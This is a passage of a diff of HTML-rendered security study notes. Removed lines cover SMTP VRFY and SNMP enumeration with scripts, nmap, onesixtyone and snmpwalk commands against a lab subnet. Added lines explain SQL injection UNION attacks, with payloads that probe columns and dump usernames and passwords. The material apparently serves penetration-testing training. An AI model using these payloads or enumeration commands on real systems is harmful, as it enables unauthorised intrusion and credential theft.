-&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;VRFY &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="c1"&gt;# Close the socket&lt;/span&gt;
-&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~/&lt;/span&gt;&lt;span class="n"&gt;Desktop&lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt; &lt;span class="n"&gt;python3&lt;/span&gt; &lt;span class="n"&gt;smtp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt; &lt;span class="n"&gt;root&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;8&lt;/span&gt;
-&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;220 mail ESMTP Postfix (Ubuntu)\r\n&amp;#39;&lt;/span&gt;
-&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;252 2.0.0 root\r\n&amp;#39;&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~/&lt;/span&gt;&lt;span class="n"&gt;Desktop&lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt; &lt;span class="n"&gt;python3&lt;/span&gt; &lt;span class="n"&gt;smtp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt; &lt;span class="n"&gt;johndoe&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;8&lt;/span&gt;
-&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;220 mail ESMTP Postfix (Ubuntu)\r\n&amp;#39;&lt;/span&gt;
-&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;550 5.1.1 &amp;lt;johndoe&amp;gt;: Recipient address rejected: User unknown in local recipient&lt;/span&gt;
-&lt;span class="s1"&gt;table\r\n&amp;#39;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;PS &lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:\&lt;/span&gt;&lt;span class="n"&gt;Users&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;student&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;Test-NetConnection&lt;/span&gt; &lt;span class="n"&gt;-Port&lt;/span&gt; &lt;span class="n"&gt;25&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;8&lt;/span&gt;
-&lt;span class="n"&gt;ComputerName&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;8&lt;/span&gt; 
-&lt;span class="n"&gt;RemoteAddress&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;8&lt;/span&gt;
-&lt;span class="n"&gt;RemotePort&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;25&lt;/span&gt;
-&lt;span class="n"&gt;InterfaceAlias&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Ethernet0&lt;/span&gt;
-&lt;span class="n"&gt;SourceAddress&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;152&lt;/span&gt;
-&lt;span class="n"&gt;TcpTestSucceeded&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;True&lt;/span&gt;
-
-&lt;span class="nb"&gt;PS &lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:\&lt;/span&gt;&lt;span class="n"&gt;Windows&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;system32&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;dism&lt;/span&gt; &lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;online&lt;/span&gt; &lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="nb"&gt;Enable-Feature&lt;/span&gt; &lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;FeatureName&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;TelnetClient&lt;/span&gt;
-
-&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:\&lt;/span&gt;&lt;span class="n"&gt;Windows&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;system32&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;telnet&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;8&lt;/span&gt; &lt;span class="n"&gt;25&lt;/span&gt;
-&lt;span class="n"&gt;220&lt;/span&gt; &lt;span class="n"&gt;mail&lt;/span&gt; &lt;span class="n"&gt;ESMTP&lt;/span&gt; &lt;span class="n"&gt;Postfix&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Ubuntu&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="n"&gt;VRFY&lt;/span&gt; &lt;span class="n"&gt;goofy&lt;/span&gt;
-&lt;span class="n"&gt;550&lt;/span&gt; &lt;span class="n"&gt;5&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;goofy&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;:&lt;/span&gt; &lt;span class="n"&gt;Recipient&lt;/span&gt; &lt;span class="n"&gt;address&lt;/span&gt; &lt;span class="n"&gt;rejected&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;User&lt;/span&gt; &lt;span class="n"&gt;unknown&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;local&lt;/span&gt; &lt;span class="n"&gt;recipient&lt;/span&gt; &lt;span class="n"&gt;table&lt;/span&gt;
-&lt;span class="n"&gt;VRFY&lt;/span&gt; &lt;span class="n"&gt;root&lt;/span&gt;
-&lt;span class="n"&gt;252&lt;/span&gt; &lt;span class="n"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt; &lt;span class="n"&gt;root&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;h3&gt;SNMP Enumeration&lt;/h3&gt;
+&lt;p&gt;Again, the application might actually return this error message, or might just return a generic error or no results. When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column. The effect on the resulting HTTP response depends on the application's code. If you are lucky, you will see some additional content within the response, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a ==NullPointerException==. Worst case, the response might be indistinguishable from that which is caused by an incorrect number of nulls, making this method of determining the column count ineffective.&lt;/p&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
-&lt;th&gt;Code&lt;/th&gt;
-&lt;th&gt;Description&lt;/th&gt;
+&lt;th&gt;🧪 LAB PRACTITIONER&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
-&lt;td&gt;1.3.6.1.2.1.25.1.6.0&lt;/td&gt;
-&lt;td&gt;System Processes&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;1.3.6.1.2.1.25.4.2.1.2&lt;/td&gt;
-&lt;td&gt;Running Programs&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;1.3.6.1.2.1.25.4.2.1.4&lt;/td&gt;
-&lt;td&gt;Processes Path&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;1.3.6.1.2.1.25.2.3.1.4&lt;/td&gt;
-&lt;td&gt;Storage Units&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;1.3.6.1.2.1.25.6.3.1.2&lt;/td&gt;
-&lt;td&gt;Software Name&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;1.3.6.1.4.1.77.1.2.25&lt;/td&gt;
-&lt;td&gt;User Accounts&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;1.3.6.1.2.1.6.13.1.3&lt;/td&gt;
-&lt;td&gt;TCP Local Ports&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns"&gt;SQL injection UNION attack, determining the number of columns returned by the query&lt;/a&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;nmap&lt;/span&gt; &lt;span class="n"&gt;-sU&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;-open&lt;/span&gt; &lt;span class="n"&gt;-p&lt;/span&gt; &lt;span class="n"&gt;161&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;254&lt;/span&gt; &lt;span class="n"&gt;-oG&lt;/span&gt; &lt;span class="nb"&gt;open-snmp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="nb"&gt;echo &lt;/span&gt;&lt;span class="n"&gt;public&lt;/span&gt; &lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;community&lt;/span&gt;
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="nb"&gt;echo &lt;/span&gt;&lt;span class="n"&gt;private&lt;/span&gt; &lt;span class="p"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;community&lt;/span&gt;
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="nb"&gt;echo &lt;/span&gt;&lt;span class="n"&gt;manager&lt;/span&gt; &lt;span class="p"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;community&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;seq&lt;/span&gt; &lt;span class="n"&gt;1&lt;/span&gt; &lt;span class="n"&gt;254&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="nb"&gt;echo &lt;/span&gt;&lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$ip&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;done&lt;/span&gt; &lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;ips&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;onesixtyone&lt;/span&gt; &lt;span class="n"&gt;-c&lt;/span&gt; &lt;span class="n"&gt;community&lt;/span&gt; &lt;span class="n"&gt;-i&lt;/span&gt; &lt;span class="n"&gt;ips&lt;/span&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;
+* The reason for using ==NULL== as the values returned from the injected ==SELECT== query is that the data types in each column must be compatible between the original and the injected queries. Since ==NULL== is convertible to every commonly used data type, using ==NULL== maximizes the chance that the payload will succeed when the column count is correct.
+* On Oracle, every ==SELECT== query must use the ==FROM== keyword and specify a valid table. There is a built-in table on Oracle called ==dual== which can be used for this purpose. So the injected queries on Oracle would need to look like: &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;UNION&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;DUAL&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;snmpwalk&lt;/span&gt; &lt;span class="n"&gt;-c&lt;/span&gt; &lt;span class="n"&gt;public&lt;/span&gt; &lt;span class="n"&gt;-v1&lt;/span&gt; &lt;span class="n"&gt;-t&lt;/span&gt; &lt;span class="n"&gt;10&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;151&lt;/span&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;The payloads described use the double-dash comment sequence ==--== to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character ==#== can be used to identify a comment.
+  For more details of database-specific syntax, see the [[SQL injection cheat sheet]].&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;h2&gt;Finding columns with a useful data type in a SQL injection UNION attack&lt;/h2&gt;
+&lt;p&gt;The reason for performing a SQL injection UNION attack is to be able to retrieve the results from an injected query. Generally, the interesting data that you want to retrieve will be in string form, so you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.
+Having already determined the number of required columns, you can probe each column to test whether it can hold string data by submitting a series of ==UNION SELECT== payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="s1"&gt;&amp;#39; UNION SELECT &amp;#39;&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,NULL,NULL,NULL--&lt;/span&gt;
+&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;UNION&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
+&lt;span class="s1"&gt;&amp;#39; UNION SELECT NULL,NULL,&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,NULL--&lt;/span&gt;
+&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;UNION&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;snmpwalk&lt;/span&gt; &lt;span class="n"&gt;-c&lt;/span&gt; &lt;span class="n"&gt;public&lt;/span&gt; &lt;span class="n"&gt;-v1&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;151&lt;/span&gt; &lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;3&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;6&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;4&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;77&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;25&lt;/span&gt;
+&lt;p&gt;If the data type of a column is not compatible with string data, the injected query will cause a database error, such as:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;Conversion&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;failed&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;when&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;converting&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;varchar&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;type&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb nb-Type"&gt;int&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;snmpwalk&lt;/span&gt; &lt;span class="n"&gt;-c&lt;/span&gt; &lt;span class="n"&gt;public&lt;/span&gt; &lt;span class="n"&gt;-v1&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;151&lt;/span&gt; &lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;3&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;6&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;25&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;4&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;2&lt;/span&gt;
+&lt;p&gt;If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;🧪 LAB PRACTITIONER&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text"&gt;SQL injection UNION attack, finding a column containing text&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2&gt;Using a SQL injection UNION attack to retrieve interesting data&lt;/h2&gt;
+&lt;p&gt;When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data.
+Suppose that:
+* The original query returns two columns, both of which can hold string data.
+* The injection point is a quoted string within the ==WHERE== clause.
+* The database contains a table called ==users== with the columns ==username== and ==password==.&lt;/p&gt;
+&lt;p&gt;⠀In this situation, you can retrieve the contents of the ==users== table by submitting the input:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;UNION&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;snmpwalk&lt;/span&gt; &lt;span class="n"&gt;-c&lt;/span&gt; &lt;span class="n"&gt;public&lt;/span&gt; &lt;span class="n"&gt;-v1&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;151&lt;/span&gt; &lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;3&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;6&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;25&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;6&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span 